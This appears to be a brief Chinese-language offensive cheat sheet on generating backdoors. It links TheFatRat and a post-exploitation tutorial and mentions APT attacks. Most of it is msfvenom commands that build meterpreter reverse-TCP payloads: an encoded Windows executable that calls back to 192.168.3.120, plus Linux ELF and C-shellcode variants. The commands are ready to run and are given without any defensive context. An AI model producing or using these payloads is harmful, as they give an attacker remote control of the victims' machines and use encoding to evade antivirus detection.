## 核心后门生成工具 

- https://github.com/Screetsec/TheFatRat

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.120 LPORT=9001 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o payload.exe
```

### linux 下
```bash
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.120 LPORT=9011 -f elf -o linux.elf
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.120 LPORT=9021 -f c
```


apt 攻击， advanced-persistent-threat


- [后渗透教程](https://xz.aliyun.com/t/2536)